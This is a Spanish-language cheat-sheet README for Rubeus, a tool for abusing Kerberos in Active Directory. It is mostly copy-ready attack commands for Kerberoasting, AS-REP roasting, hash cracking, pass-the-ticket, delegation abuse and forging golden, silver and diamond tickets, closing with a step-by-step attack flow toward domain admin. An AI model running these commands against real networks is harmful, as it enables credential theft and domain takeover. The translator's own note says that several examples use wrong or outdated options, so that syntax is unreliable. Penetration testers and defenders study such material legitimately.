# 🎫 Rubeus: herramientas para abusar de Kerberos

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Interacción y abuso de Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

> **Precisiones del original:** TGT es el ticket que permite solicitar tickets de servicio; SPN identifica un servicio. Se conservan los ejemplos, aunque algunos están incompletos o dependen de la versión. La [documentación oficial de Rubeus](https://github.com/GhostPack/Rubeus) usa `/rc4:` o claves AES para `golden`, no `/krbtgt:`; `diamond` requiere además la clave de krbtgt mediante `/krbkey:`. `/rc4opsec` filtra cuentas sin AES y no equivale a forzar RC4 en cualquier cuenta. Los modos de Hashcat mostrados corresponden a los formatos RC4 indicados, no a todos los tipos de cifrado. `/luid:0x3e7` selecciona la sesión de SYSTEM, no todas las sesiones; `/ptt` aplica el ticket a una sesión y no crea por sí solo una nueva. Las operaciones S4U pueden encadenar S4U2Self y S4U2Proxy, y dependen de la delegación configurada. Cargar un ensamblado con `LoadFile` no ejecuta automáticamente su punto de entrada. AES no garantiza evitar la detección.

---

## 📋 Índice

- [Qué es Rubeus](#qué-es-rubeus)
- [Operaciones con tickets](#operaciones-con-tickets)
- [Kerberoasting](#kerberoasting)
- [AS-REP Roasting](#as-rep-roasting)
- [Ataques con tickets](#ataques-con-tickets)
- [Ataques de delegación](#ataques-de-delegación)
- [Golden Tickets y Silver Tickets](#golden-tickets-y-silver-tickets)
- [Referencia rápida](#referencia-rápida)

---

<a id="qué-es-rubeus"></a>

## 🎯 Qué es Rubeus

**Rubeus** es un conjunto de herramientas en C# para interactuar con Kerberos y abusar de sus funciones:

- 🎫 **Operaciones con tickets**: solicitar, renovar y describir tickets
- 🔓 **Kerberoasting**: extraer material cifrado de tickets de servicio para intentar recuperar contraseñas sin conexión
- 🔑 **AS-REP Roasting**: atacar cuentas de usuario sin preautenticación Kerberos
- 🎭 **Pass-the-Ticket**: reutilizar tickets robados
- ✨ **Golden Tickets y Silver Tickets**: falsificar tickets

---

## 🚀 Uso básico

### Ejecución de Rubeus

```powershell
# Ejecución directa
.\Rubeus.exe <command> [options]

# Ejecutar en memoria (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Cargar mediante PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="operaciones-con-tickets"></a>

## 🎟️ Operaciones con tickets

### Solicitud de un TGT

```powershell
# Con una contraseña
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Con un hash NTLM
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Con una clave AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Con un certificado
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Guardar la salida en un archivo
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Solicitud de un TGS

```powershell
# Solicitar un ticket de servicio
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Con un TGT desde un archivo
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Listado de tickets

```powershell
# Listar los tickets del usuario actual
.\Rubeus.exe triage

# Listar todos los tickets (requiere administrador, según el original; véase la precisión sobre LUID)
.\Rubeus.exe triage /luid:0x3e7

# Volcado detallado de tickets
.\Rubeus.exe dump
```

### Pass-the-Ticket

```powershell
# Importar el ticket en la sesión actual
.\Rubeus.exe ptt /ticket:base64ticket

# Importar desde un archivo
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Crear una nueva sesión de inicio de sesión e importar el ticket
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Descripción de un ticket

```powershell
# Mostrar los detalles del ticket
.\Rubeus.exe describe /ticket:base64ticket

# Desde un archivo
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

<a id="kerberoasting"></a>

## 🍖 Kerberoasting

### Kerberoasting básico

```powershell
# Realizar Kerberoasting sobre todos los nombres principales de servicio (SPN)
.\Rubeus.exe kerberoast

# Guardar la salida en un archivo (formato de Hashcat)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Seleccionar un usuario concreto
.\Rubeus.exe kerberoast /user:sqlservice

# Forzar RC4 (etype 23), según el original; véase la precisión sobre /rc4opsec
.\Rubeus.exe kerberoast /rc4opsec
```

### Kerberoasting avanzado

```powershell
# Con un TGT concreto
.\Rubeus.exe kerberoast /ticket:base64tgt

# Solo estadísticas (sin solicitar tickets)
.\Rubeus.exe kerberoast /stats

# Seleccionar un SPN concreto
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# Cifrado AES (más discreto, según el original; no garantiza evitar la detección)
.\Rubeus.exe kerberoast /aes

# Filtrar por usuario
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Recuperación de contraseñas a partir de hashes de Kerberoasting

```bash
# Hashcat (modo 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

<a id="as-rep-roasting"></a>

## 🔓 AS-REP Roasting

### AS-REP Roasting básico

```powershell
# Buscar usuarios sin preautenticación y obtener material para AS-REP Roasting
.\Rubeus.exe asreproast

# Guardar la salida en un archivo
.\Rubeus.exe asreproast /outfile:asrep.txt

# Seleccionar un usuario concreto
.\Rubeus.exe asreproast /user:targetuser

# Formato de Hashcat
.\Rubeus.exe asreproast /format:hashcat
```

### Recuperación de contraseñas a partir de hashes AS-REP

```bash
# Hashcat (modo 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

<a id="ataques-con-tickets"></a>

## 🎭 Ataques con tickets

### Overpass-the-Hash (Pass-the-Key)

```powershell
# Obtener un TGT con un hash y crear una nueva sesión (según el original; véase la precisión sobre /ptt)
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Con una clave AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Crear un proceso auxiliar para una sesión independiente
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

```powershell
# S4U2Self: suplantar al usuario ante el propio servicio
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy: suplantar al usuario ante otro servicio
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Cadena completa
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="ataques-de-delegación"></a>

## 🔀 Ataques de delegación

### Delegación sin restricciones

```powershell
# Vigilar la aparición de TGT en un equipo con delegación sin restricciones
.\Rubeus.exe monitor /interval:5 /nowrap

# Filtro específico
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Recopilar TGT
.\Rubeus.exe harvest /interval:30
```

### Delegación restringida

```powershell
# Solicitar un ticket para un servicio permitido
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Delegación restringida basada en recursos

```powershell
# Después de configurar RBCD con PowerMad/PowerView
# Solicitar el ticket como el equipo del atacante
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="golden-tickets-y-silver-tickets"></a>

## ✨ Golden Tickets y Silver Tickets

### Golden Ticket

```powershell
# Crear un Golden Ticket (requiere el hash de krbtgt)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Especificar los grupos
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Con una clave AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

```powershell
# Crear un Silver Ticket (requiere el hash de la cuenta de servicio)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# Servicio LDAP (DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

```powershell
# TGT legítimo modificado
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

<a id="referencia-rápida"></a>

## 📊 Referencia rápida

### Comandos esenciales

| Comando | Descripción |
|---------|-------------|
| `asktgt` | Solicitar un ticket de concesión de tickets (TGT) |
| `asktgs` | Solicitar un ticket de servicio (TGS) |
| `kerberoast` | Extraer material cifrado de tickets de servicio para recuperar contraseñas |
| `asreproast` | Realizar AS-REP Roasting |
| `ptt` | Reutilizar un ticket con Pass-the-Ticket |
| `s4u` | S4U (Service for User): delegación de identidad para servicios |
| `golden` | Falsificar un Golden Ticket (TGT) |
| `silver` | Falsificar un Silver Ticket (ticket de servicio) |
| `dump` | Volcar todos los tickets |
| `triage` | Listar los tickets |

### Opciones de autenticación

| Opción | Descripción |
|--------|-------------|
| `/user:` | Nombre de usuario |
| `/password:` | Contraseña |
| `/rc4:` | Hash NTLM |
| `/aes256:` | Clave AES256 |
| `/ticket:` | Ticket en Base64 |

### Opciones habituales

| Opción | Descripción |
|--------|-------------|
| `/ptt` | Reutilizar un ticket con Pass-the-Ticket |
| `/outfile:` | Guardar la salida en un archivo |
| `/nowrap` | Evitar los saltos de línea en Base64 |
| `/domain:` | Dominio de destino |
| `/dc:` | Controlador de dominio |

### Flujo de ataque

```powershell
# 1. Realizar Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Recuperar las contraseñas a partir de los hashes
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Obtener un TGT con la contraseña recuperada
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. O utilizar Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Acceder a los recursos
dir \\server\share
```

---

## 📚 Recursos

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y Blog](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Guías relacionadas
- [BloodHound](../../BloodHound/translations/README.es.md)
- [Impacket](../../Impacket/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

<p align="center">
  <b>🎫 ¡Domina Kerberos!</b><br>
  <i>Rubeus: el ticket hacia los privilegios de administrador del dominio</i>
</p>
